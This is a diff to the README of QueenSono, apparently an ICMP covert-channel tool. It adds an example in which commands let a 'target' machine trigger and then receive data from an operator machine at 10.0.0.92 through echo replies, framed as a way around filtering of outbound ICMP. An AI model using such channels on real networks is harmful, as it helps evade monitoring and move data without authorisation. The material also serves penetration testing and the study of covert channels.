@@ -196,6 +196,42 @@ But it works ⇔ we have received ALL the chunks, otherwise the decryption will 
 => We  could encrypt each chunk accordingly with the `-s` parameter, like this we could decrypt them separately.
 
 
+### Example 4: Receive data via echo reply ↩️
+*\> In this example the local machine sends data **back** to the target via ICMP echo replies. Useful when outbound ICMP from the target is filtered but the target can receive echo replies.*
+
+On local machine:
+
+    $ qsreceiver reply-send "secret data to exfiltrate" -l 0.0.0.0 -d 1
+
+<details>
+  <summary><b>Explanation</b></summary>
+    <li>
+    <code>reply-send</code> waits for a trigger from <code>qssender</code>, then sends data back as ICMP echo replies
+    </li>
+    <li>
+      <code>-l 0.0.0.0</code> listen on all interfaces for the trigger packet
+    </li>
+    <li><code>-d 1</code> delay of 1 second between each reply packet</li>
+
+</details>
+
+
+On target machine:
+
+    $ qssender receive -l 0.0.0.0 -r 10.0.0.92
+
+<details>
+  <summary><b>Explanation</b></summary>
+    <li>
+    <code>receive</code> sends a trigger to <code>qsreceiver</code> and collects data from incoming echo replies
+    </li>
+    <li>
+      <code>-l 0.0.0.0</code> the listening address for incoming echo replies
+    </li>
+    <li><code>-r 10.0.0.92</code> the address of my local machine with <code>qsreceiver reply-send</code> waiting</li>
+</details>
+
+
 ### Bonus
 
 See [hack](https://github.com/ariary/QueenSono/tree/main/hack) section for fun things with `QueenSono`:
